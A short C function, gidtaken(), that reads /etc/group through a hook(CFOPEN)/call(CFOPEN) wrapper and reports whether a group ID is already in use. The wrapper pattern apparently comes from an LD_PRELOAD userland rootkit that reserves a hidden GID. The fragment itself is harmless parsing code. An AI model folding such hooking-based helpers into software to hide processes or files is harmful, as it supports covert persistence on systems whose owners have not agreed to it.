int gidtaken(gid_t newgid){
    hook(CFOPEN);
    FILE *fp = call(CFOPEN, "/etc/group", "r");
    if(fp == NULL)
        return -1;

    char line[LINE_MAX], *linedup, *linetok;
    int taken=0, c=0;
    gid_t curgid;

    memset(line,0,sizeof(line));

    while(fgets(line,sizeof(line),fp) != NULL && taken != 1){
        c=0;
        linedup = strdup(line);
        linetok = strtok(linedup, ":");

        while(linetok != NULL && taken != 1){
            if(c++ == 2){
                curgid = (gid_t)atoi(linetok);
                if(curgid == newgid)
                    taken = 1;
            }
            linetok = strtok(NULL, ":");
        }

        free(linedup);
    }
    fclose(fp);

    return taken;
}